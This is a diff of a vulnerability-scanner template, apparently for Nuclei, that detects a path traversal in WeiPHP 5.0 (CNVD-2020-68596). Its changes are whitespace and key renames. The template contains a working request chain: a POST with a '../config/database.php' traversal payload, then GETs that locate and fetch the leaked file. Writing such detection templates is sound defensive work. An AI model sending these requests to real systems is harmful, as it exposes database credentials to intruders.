@@ -1,5 +1,4 @@
 id: CNVD-2020-68596
-
 info:
   name: WeiPHP 5.0 - Path Traversal
   author: pikpikcu
@@ -12,8 +11,7 @@ info:
     cvss-score: 8.6
     cwe-id: CWE-22
   tags: weiphp,lfi,cnvd,cnvd2020
-
-http:
+requests:
   - raw:
       - |
         POST /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php HTTP/1.1
@@ -24,12 +22,9 @@ http:
       - |
         GET /public/index.php/home/file/user_pics HTTP/1.1
         Host: {{Hostname}}
-
-
       - |
         GET {{endpoint}} HTTP/1.1
         Host: {{Hostname}}
-
     extractors:
       - type: regex
         name: endpoint
@@ -37,7 +32,6 @@ http:
         internal: true
         regex:
           - '/public/uploads/picture/(.*.jpg)'
-
     matchers:
       - type: word
         part: body
